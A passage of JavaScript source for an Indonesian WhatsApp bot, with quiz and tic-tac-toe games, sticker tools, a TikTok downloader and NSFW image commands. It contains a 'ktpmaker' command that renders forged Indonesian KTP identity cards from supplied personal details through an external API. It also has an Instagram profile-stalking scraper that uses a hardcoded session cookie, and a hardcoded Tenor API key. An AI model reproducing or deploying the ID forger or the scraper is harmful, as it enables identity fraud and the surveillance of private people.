const tokenn = await axios.get("https://downvideo.quora-wiki.com/tiktok-video-downloader#url=" + url);
let a = cheerio.load(tokenn.data);
let token = a("#token").attr("value");
const param = {
    url: url,
    token: token,
};
const { data } = await axios.request("https://downvideo.quora-wiki.com/system/action.php", {
method: "post",
data: new URLSearchParams(Object.entries(param)),
headers: {
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    "referer": "https://downvideo.quora-wiki.com/tiktok-video-downloader",
},
    }
);
return {
    status: 200,
    title: data.title,
    thumbnail: data.thumbnail,
    duration: data.duration,
    media: data.medias,
};
    } catch (e) {
return e
    }
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}
async function sendPlay(from, query) {
var url = await yts(query)
url = url.videos[0].url
hxz.youtube(url).then(async(data) => {
haikal.sendMessage(from, {image: {url: data.thumb}, caption:`⭔ *Title :* ${data.title}
⭔ *ID :* ${data.id}
⭔ *Quality :* ${data.quality}
⭔ *Audio Size :* ${data.size_mp3}
⭔ *Video Size :* ${data.size}
⭔ *Url :* https://youtu.be/${data.id}

ytmp3 ${url} = 🎵 Audio (${data.size_mp3}
ytmp4 ${url} = 🎥 Video (${data.size}`})
   }).catch((e) => {
 haikal.sendMessage(from, { text: mess.error.api }, { quoted: msg })
   ownerNumber.map( i => haikal.sendMessage(from, { text: `Send Play Error : ${e}` }))
   })
}

//LOGO MENTAHAN
const hw1 = fs.readFileSync ('./baseikal/logo/hw1.jpg')
const hw2 = fs.readFileSync ('./baseikal/logo/hw2.jpg')
const hw3 = fs.readFileSync ('./baseikal/logo/hw3.jpg')
const hw4 = fs.readFileSync ('./baseikal/logo/hw4.jpg')
const hw5 = fs.readFileSync ('./baseikal/logo/hw5.jpg')
const hw6 = fs.readFileSync ('./baseikal/logo/hw6.jpg')
const hw7 = fs.readFileSync ('./baseikal/logo/hw7.jpg')
const hw8 = fs.readFileSync ('./baseikal/logo/hw8.jpg')
const hw9 = fs.readFileSync ('./baseikal/logo/hw9.jpg')
const hw10 = fs.readFileSync ('./baseikal/logo/hw10.jpg')
const hw11 = fs.readFileSync ('./baseikal/logo/hw11.jpg')
const hw12 = fs.readFileSync ('./baseikal/logo/hw12.jpg')
const hw13 = fs.readFileSync ('./baseikal/logo/hw13.jpg')
const hw14 = fs.readFileSync ('./baseikal/logo/hw14.jpg')
const hw15 = fs.readFileSync ('./baseikal/logo/hw15.jpg')
const hw16 = fs.readFileSync ('./baseikal/logo/hw16.jpg')
const hw17 = fs.readFileSync ('./baseikal/logo/hw17.jpg')
const hw18 = fs.readFileSync ('./baseikal/logo/hw18.jpg')
const hw19 = fs.readFileSync ('./baseikal/logo/hw19.jpg')
const hw20 = fs.readFileSync ('./baseikal/logo/hw20.jpg')
const hw21 = fs.readFileSync ('./baseikal/logo/hw21.jpg')
const hw22 = fs.readFileSync ('./baseikal/logo/hw22.jpg')
const hw23 = fs.readFileSync ('./baseikal/logo/hw23.jpg')
const hw24 = fs.readFileSync ('./baseikal/logo/hw24.jpg')
const hw25 = fs.readFileSync ('./baseikal/logo/hw25.jpg')
const hw26 = fs.readFileSync ('./baseikal/logo/hw26.jpg')
const hw27 = fs.readFileSync ('./baseikal/logo/hw27.jpg')
const hw28 = fs.readFileSync ('./baseikal/logo/hw28.jpg')
const hw29 = fs.readFileSync ('./baseikal/logo/hw29.jpg')
const hw30 = fs.readFileSync ('./baseikal/logo/hw30.jpg')
const hw31 = fs.readFileSync ('./baseikal/logo/hw31.jpg')
const hw32 = fs.readFileSync ('./baseikal/logo/hw32.jpg')
const hw33 = fs.readFileSync ('./baseikal/logo/hw33.jpg')
const hw34 = fs.readFileSync ('./baseikal/logo/hw34.jpg')
const hw35 = fs.readFileSync ('./baseikal/logo/hw35.jpg')
const hw36 = fs.readFileSync ('./baseikal/logo/hw36.jpg')
const hw37 = fs.readFileSync ('./baseikal/logo/hw37.jpg')
const hw38 = fs.readFileSync ('./baseikal/logo/hw38.jpg')
const hw39 = fs.readFileSync ('./baseikal/logo/hw39.jpg')
const hw40 = fs.readFileSync ('./baseikal/logo/hw40.jpg')
const hw41 = fs.readFileSync ('./baseikal/logo/hw41.jpg')
const hw42 = fs.readFileSync ('./baseikal/logo/hw42.jpg')
const hw43 = fs.readFileSync ('./baseikal/logo/hw43.jpg')
const hw44 = fs.readFileSync ('./baseikal/logo/hw44.jpg')
const hw45 = fs.readFileSync ('./baseikal/logo/hw45.jpg')
const hw46 = fs.readFileSync ('./baseikal/logo/hw46.jpg')
const hw47 = fs.readFileSync ('./baseikal/logo/hw47.jpg')
const hw48 = fs.readFileSync ('./baseikal/logo/hw48.jpg')
const hw49 = fs.readFileSync ('./baseikal/logo/hw49.jpg')
const hw50 = fs.readFileSync ('./baseikal/logo/hw50.jpg')
const hw51 = fs.readFileSync ('./baseikal/logo/hw51.jpg')
const hw52 = fs.readFileSync ('./baseikal/logo/hw52.jpg')
const hw53 = fs.readFileSync ('./baseikal/logo/hw53.jpg')
const hw54 = fs.readFileSync ('./baseikal/logo/hw54.jpg')
const hw55 = fs.readFileSync ('./baseikal/logo/hw55.jpg')
const hw56 = fs.readFileSync ('./baseikal/logo/hw56.jpg')
const hw57 = fs.readFileSync ('./baseikal/logo/hw57.jpg')
const hw58 = fs.readFileSync ('./baseikal/logo/hw58.jpg')
const hw59 = fs.readFileSync ('./baseikal/logo/hw59.jpg')
const hw60 = fs.readFileSync ('./baseikal/logo/hw60.jpg')
const hw61 = fs.readFileSync ('./baseikal/logo/hw61.jpg')
const hw62 = fs.readFileSync ('./baseikal/logo/hw62.jpg')
const hw63 = fs.readFileSync ('./baseikal/logo/hw63.jpg')
const hw64 = fs.readFileSync ('./baseikal/logo/hw64.jpg')
const hw65 = fs.readFileSync ('./baseikal/logo/hw65.jpg')
const hw66 = fs.readFileSync ('./baseikal/logo/hw66.jpg')
const hw67 = fs.readFileSync ('./baseikal/logo/hw67.jpg')
const hw68 = fs.readFileSync ('./baseikal/logo/hw68.jpg')
const hw69 = fs.readFileSync ('./baseikal/logo/hw69.jpg')
const hw70 = fs.readFileSync ('./baseikal/logo/hw70.jpg')
const hw71 = fs.readFileSync ('./baseikal/logo/hw71.jpg')
const hw72 = fs.readFileSync ('./baseikal/logo/hw72.jpg')
const hw73 = fs.readFileSync ('./baseikal/logo/hw73.jpg')
const hw74 = fs.readFileSync ('./baseikal/logo/hw74.jpg')
const hw75 = fs.readFileSync ('./baseikal/logo/hw75.jpg')
const hw76 = fs.readFileSync ('./baseikal/logo/hw76.jpg')
const hw77 = fs.readFileSync ('./baseikal/logo/hw77.jpg')
const hw78 = fs.readFileSync ('./baseikal/logo/hw78.jpg')
const hw79 = fs.readFileSync ('./baseikal/logo/hw79.jpg')
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SuksesCok.webp')
haikal.sendImageAsSticker(from, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
    if (setting) {
if (!('inod' in setting)) setting.inod = true
if (!('sura' in setting)) setting.sura = false
if (!('hwmods' in setting)) setting.hwmods = false
if (!('onkabeh' in setting)) setting.onkabeh = false
if (!('offkabeh' in setting)) setting.offkabeh = false
if (!('inod1' in setting)) setting.inod1 = true
if (!('sura1' in setting)) setting.sura1 = false
if (!('hwmods1' in setting)) setting.hwmods1 = false
if (!('onkabeh1' in setting)) setting.onkabeh1 = false
if (!('offkabeh1' in setting)) setting.offkabeh1 = false
	    } else global.db.data.settings[botNumber] = {
inod: true,
sura: false,
hwmods: false,
onkabeh: false,
offkabeh: false,
inod1: true,
sura1: false,
hwmods1: false,
onkabeh1: false,
offkabeh1: false,
	    }
} catch (err) {
console.log(err)
}
	if (('family100'+from in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+from]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            haikal.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+from]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
           await haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, { quoted: m })                
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, { quoted: m })
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, { quoted: m }) 
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, { quoted: m }) 
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, { quoted: m }) 
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, { quoted: m }) 
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, { quoted: m }) 
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
	    if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    haikal.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = from
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    haikal.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) haikal.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) haikal.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) haikal.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    haikal.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) haikal.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) haikal.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    haikal.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//=================================================//
switch(command) {
//=================================================//
case 'afk': {
if (!isCreator) return m.reply(mess.owner)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${text ? ': ' + text : ''}`)
}
break
case 'nsfw': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Emang Lu Admin?')
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `「 ⚠️ Peringatan ⚠️ 」\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

Ketik On Untuk Menyalakan Fitur Ini
Ketif Of Untuk Menon Aktifkan Fitur Ini

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
haikal.sendMessage(from, anuala, `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!AntiNsfww) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `© ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${buttonkal}`,
} 
haikal.sendMessage(from, bugcrot, { quoted:m}).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!AntiNsfww) return m.reply(mess.nsfw)
m.reply('Sabar Cuy Loading')
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `© ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${buttonkal}`,
} 
haikal.sendMessage(from, bugahay, { quoted:m}).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'ktpmaker': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
get_args = args.join(" ").split("|")
nik = get_args[0]
if (!nik) return m.reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
prov = get_args[1]
if (!prov) return m.reply('probinsi mana kak')
kabu = get_args[2]
if (!kabu) return m.reply('kabupaten mana kak')
name = get_args[3]
if (!name) return m.reply('nama nya siapa kak')
ttl = get_args[4]
if (!ttl) return m.reply('tempat tanggal lahir nya kak')
jk = get_args[5]
if (!jk) return m.reply('jenis kelamin pria atau wanita kak')
jl = get_args[6]
if (!jl) return m.reply('alamat rumah nya mana kak')
rtrw = get_args[7]
if (!rtrw) return m.reply('RT / RW berapa kak')
lurah = get_args[8]
if (!lurah) return m.reply('kelurahan mana kak')
camat = get_args[9]
if (!camat) return m.reply('kecamatan mana kak')
agama = get_args[10]
if (!agama) return m.reply('agama nya apa kak')
nikah = get_args[11]
if (!nikah) return m.reply('status belum ada')
kerja = get_args[12]
if (!kerja) return m.reply('pekerjaan belum ada')
warga = get_args[13]
if (!warga) return m.reply('region belum ada')
until = get_args[14]
if (!until) return m.reply('waktu berlaku belum ada')
gd = get_args[15]
if (!gd) return m.reply('golongan darah belum ada')
img = get_args[16]
if (!img) return m.reply('url image belum ada')
      m.reply('Sabar Cuy Loading')
bikin = (`https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gd=${gd}&almt=${jl}&rtw=${rtrw}&kel=${lurah}&kc=${camat}&agm=${agama}&st=${nikah}&krj=${kerja}&ngr=${warga}&blk=${until}&prv=${prov}&kab=${kabu}&picturl=${img}`)
console.log(bikin)
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await haikal.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: m })
sticSukses(from)
//await sleep(5000)
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'emojimix': { 
if (!isCreator) return m.reply(mess.owner)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'smeme':
if (!text) throw `Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
m.reply('Sabar Cuy Loading')
mee = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
haikal.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break
//==============================================*===//
case 'toimage': case 'toimg': {
if (!isCreator) return m.reply(mess.owner)
